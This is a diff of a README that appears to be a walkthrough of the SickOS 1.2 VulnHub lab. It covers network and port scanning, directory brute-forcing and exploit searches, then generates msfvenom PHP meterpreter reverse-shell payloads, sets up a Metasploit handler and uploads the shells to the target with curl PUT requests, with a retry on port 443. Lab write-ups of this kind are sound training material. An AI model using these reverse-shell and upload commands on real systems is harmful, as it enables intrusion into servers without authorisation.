@@ -2,10 +2,10 @@
 this repo is based on [SickOS](https://www.vulnhub.com/entry/sickos-12,144/). 
 
 # Setup 
-I am using VMware. The creator said he had issues on virtualbox which works perfectly for me, I pefer VMware. I am also using Kali linux. 
+I am using VMware. The creator of SickOS claims that there is trouble with VMbox. Kali Linux is the OS I am using for penetration. 
 
 # Reconnaissance 
-Using the command ``` netdiscover -i eth0 ```, I was able to find the ip for SickOs1.2 which is listed below 
+THe first step is to use the command ``` netdiscover -i eth0 ``` to pull the IP. Below is what is shown, we have the IP.
 
 ```
 192.168.1.142   00:0c:29:10:88:6e      2     120  VMware, Inc. 
@@ -14,7 +14,7 @@ Typing in that ip in the browser, the website shows
 
 <img width="1192" alt="Screen Shot 2021-04-22 at 12 31 52 PM" src="https://user-images.githubusercontent.com/81980702/115762191-d0351c80-a368-11eb-91f3-2a7778ae2b10.png">
 
-Viewing the page source, this is what is shown below. 
+Viewing the page source, this is what is shown below. Not much more information than a meme. Is it true? We will never know.  
 ```
 <html>
 
@@ -24,7 +24,11 @@ Viewing the page source, this is what is shown below.
 
 <!-- NOTHING IN HERE ///\\\ -->>>>
 ````
-Running ``` nmap -A -T4 -p- 192.168.1.142 ```, I get this text below. ***Breakdown of flags*** -A = Enables OS detection, version detection, script scanning, and trace route -T4 = Sets timmimg template -p = port range  
+Running ``` nmap -A -T4 -p- 192.168.1.142 ```, I get this text below. 
+> ***Breakdown of flags***
+>-A = Enables OS detection, version detection, script scanning, and trace route 
+>-T4 = Sets timmimg template 
+>-p = port range  
 
 ```
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-22 12:57 CDT
@@ -51,7 +55,9 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 TRACEROUTE
 ```
-# Brute attack
+We can gather alot of information about the nmap scan. We can see 22 and 80 tcp ports open. we can also see that it is running ``openssh 5.9 p1 Debian`` and ``lightpd 1.4.28``
+
+# Gobuster Brute Attack for directories 
 
 Using ```gobuster dir --url http://192.168.1.142 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt ```, You can find the directories of the website. Here is what it returned below.
 
@@ -77,11 +83,12 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 2021/04/22 13:23:05 Finished
 ===============================================================
 ```
-Looks like the directory that gobuster found was ```/test``` and ```/%7Echeckout%7E```
+Looks like the directory that gobuster found was ```/test``` and ```/%7Echeckout%7E```. We can access the directory by typing it in the search bar such ass ``192.168.1.142/test``
 <img width="386" alt="Screen Shot 2021-04-22 at 8 59 57 PM" src="https://user-images.githubusercontent.com/81980702/115807226-d699b780-a3ad-11eb-8c69-98e43808be09.png">
 
 The parent directory brings us back to the picture and we can tell that it is using lighttpd/1.4.28
 
+# Finding Explouts 
 Through our reconnaissance, we can tell that the server is running ```OpenSSH 5.9p1```. Running command ```searchsploit openSSH 5.9p1```. We can see this below 
 ```
 -------------------------------------------------------------- ---------------------------------
@@ -96,7 +103,12 @@ OpenSSH < 7.4 - agent Protocol Arbitrary Library Loading      | linux/remote/409
 OpenSSH < 7.7 - User Enumeration (2)                          | linux/remote/45939.py
 -------------------------------------------------------------- ---------------------------------
 ```
-using ``` ls -al /usr/share/nmap/scripts/ | grep -e "http-" ``` **Breakdown** -al = all with author. -e = extend pattern. We want to use these scripts below. 
+using ``` ls -al /usr/share/nmap/scripts/ | grep -e "http-" ``` 
+>**Breakdown** 
+>-al = all with author. 
+>-e = extend pattern. 
+
+We want to use these scripts below. 
 
 ```
 `-rw-r--r-- 1 root root 20667 Oct 12  2020 http-enum.nse
@@ -110,7 +122,7 @@ PORT   STATE SERVICE
 |_  /test/: Test page
 MAC Address: 00:0C:29:10:88:6E (VMware)
 ```
-Running ``` nmap sV -p 80 192.168.1.142 --script http-methods ```, We can see the method supported is 
+Running ``` nmap sV -p 80 192.168.1.142 --script http-methods ```, We can see the method supported is. Get Head Post Options
 ```
 PORT   STATE SERVICE
 80/tcp open  http
@@ -129,11 +141,12 @@ PORT   STATE SERVICE
 |_  Path tested: /test
 MAC Address: 00:0C:29:10:88:6E (VMware)
 ```
-# Reverse shell 
-Running command ```msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.200 LPORT=1234 -f raw > shell.php```
-The pay load is set 
+# Creating the payload
+Running command ```msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.200 LPORT=1234 -f raw > shell.php``` The payload gets set 
 
-using command ```msfconsole```, metasploit is brought up. 
+# Metasploit
+
+using command ```msfconsole```, metasploit is brought up. Put the commands in the order shown below.
 
 ```
 use exploit/multi/handle 
@@ -141,19 +154,20 @@ set payload php/meterpreter_reverse_tcp
 set LHOST 192.168.1.200
 set LPORT 1234
 ```
+Upload the payload onto 192.168.1.142 with the command below.
 ```
 curl -T shell.php http://192.168.1.142/test/shell.php --http1.0
 ```
 <img width="515" alt="Screen Shot 2021-04-22 at 10 03 17 PM" src="https://user-images.githubusercontent.com/81980702/115812205-a0ad0100-a3b6-11eb-864b-e556149f86f0.png">
 
-click run on handler then click on the shell you imported on the website 
+# Possible firewall with port 1234
+When the handle is clicked, there seems to be an error because ``/`` us returned.
 
-There is an error, the box only runs on port 80 and 443. There is a fire wall. 
+Set the newpayload with the correct port below. 
 ```
 msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.200 LPORT=443 -f raw > shell.php
 ```
-set LPORT 433 in metaexploit
+Naming it reverse.php so we can distiguish it with ``payload.php``
 ```
 curl -T shell.php http://192.168.1.142/test/reverse.php
-```
-Rename and upload 
+
